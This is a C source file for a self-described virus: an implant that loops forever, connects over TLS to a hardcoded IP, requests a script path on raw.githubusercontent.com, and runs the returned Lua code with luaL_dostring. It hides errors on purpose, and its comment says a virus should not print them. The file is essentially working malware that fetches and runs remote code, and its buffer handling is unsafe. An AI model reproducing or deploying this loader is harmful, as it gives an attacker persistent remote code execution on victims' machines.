#include <stdlib.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <strings.h>
#include <unistd.h>

#include <lua.h>
#include <lauxlib.h>
#include <lualib.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

SSL *ssl;
int sock;

/*
 * todo: rename programString
 * todo: rename luaString
 */

int execute(lua_State *L, char *programString) {
	// todo: update this to actually execute programString
	//int RET = luaL_dostring(L, "print('hi from lua')");
	char *luaString;
	luaString = strstr(programString, "\r\n\r\n");
	int RET = luaL_dostring(L, luaString);
	/*
	 * not a good idea to print error messages when you are a virus
	if (RET == LUA_OK) {
		printf("no errors\n");
	} else {
		printf("errors\n");
	}
	*/
	return 0;
}

int recvPacket(char *programString) {
	int err;
	int len = 100;
	char buf[101];
	// refactor to for loop
	// refactor error handling
	while(1) {
		err = SSL_get_error(ssl, len);
		if(err == SSL_ERROR_NONE) {
			len=SSL_read(ssl, buf, 100);
			buf[len] = '\0';
			strcat(programString, buf);
			if(strstr(buf, "-- the end") != NULL) {
				return 0;
			}

		 } else {
			//printf("Error\n");
			if(err == SSL_ERROR_NONE)
				continue;
			if(err == SSL_ERROR_WANT_READ)
				return 0;
			if(err == SSL_ERROR_WANT_WRITE)
				return 0;
			if(err == SSL_ERROR_ZERO_RETURN || err == SSL_ERROR_SYSCALL || err == SSL_ERROR_SSL)
				return -1;
			// should not get here
			return 0;
		}
	}
	return 0;
}

int sendPacket(const char *buf) {
	int len = SSL_write(ssl, buf, strlen(buf));
	if (len < 0) {
		int err = SSL_get_error(ssl, len);
	switch (err) {
		case SSL_ERROR_WANT_WRITE:
			return 0;
		case SSL_ERROR_WANT_READ:
			return 0;
		case SSL_ERROR_ZERO_RETURN:
		case SSL_ERROR_SYSCALL:
		case SSL_ERROR_SSL:
		default:
			return -1;
		}
	}
	return 0;
}


int main(int argc, char *argv[]) {
	int err, s;
	char *programString;
	const SSL_METHOD *sslMethod;
	lua_State *L;

	while(1) {
		struct sockaddr_in sa;
		s = socket(AF_INET, SOCK_STREAM, 0);
		if(!s) {
			//printf("Error creating socket.\n");
			sleep(3600);
			continue;
		}
		memset(&sa, 0, sizeof(sa));
		sa.sin_family		= AF_INET;
		sa.sin_addr.s_addr	= inet_addr("151.101.44.133");
		//sa.sin_addr.s_addr	= inet_addr("127.0.0.1");
		sa.sin_port		= htons(443);
		socklen_t socklen	= sizeof(sa);

		if (connect(s, (struct sockaddr *)&sa, socklen)) {
			/*
			if(errno == EBADF) printf("here\n");
			printf("Error connecting to server.\n");
			return -1;
			*/
			sleep(3600);
			continue;
		}

		L = luaL_newstate();
	
		SSL_library_init();
		SSLeay_add_ssl_algorithms();
		SSL_load_error_strings();
		sslMethod = TLSv1_2_client_method();

		SSL_CTX *ctx = SSL_CTX_new(sslMethod);
		ssl = SSL_new(ctx);
		if(!ssl) {
			printf("Error creating SSL.\n");
			//log_ssl();
			return -1;
		}
		sock = SSL_get_fd(ssl);
		SSL_set_fd(ssl, s);
		err = SSL_connect(ssl);
		if (err <= 0) {
			/*
			printf("Error creating SSL connection. err=%x\n", err);
			fflush(stdout);
			return -1;
			*/
			sleep(3600);
			continue;
		}
		//printf("SSL connection using %s\n", SSL_get_cipher(ssl));

		// request is where we ping to get a program string
		// responseString is all the data received to be parsed to remove lua
		// programString is the lua string we will execute
		char *request = "GET /nccapollo/rover/master/1 HTTP/1.1\r\nHost: raw.githubusercontent.com\r\n\r\n";
		programString = (char*)malloc(4096);

		sendPacket(request);
		recvPacket(programString);

		luaL_openlibs(L);
		//int RET = luaL_dofile(L, "script.lua");
		//int RET = luaL_loadstring(L, "4+1");
		err = execute(L, programString);

		lua_close(L);
		// Don't free the string until after it's been used
		free(programString);
		SSL_free(ssl); //  connection state
		SSL_CTX_free(ctx); // free context
		close(s);
		sleep(60);
		// end while
		}

	return 0;
}
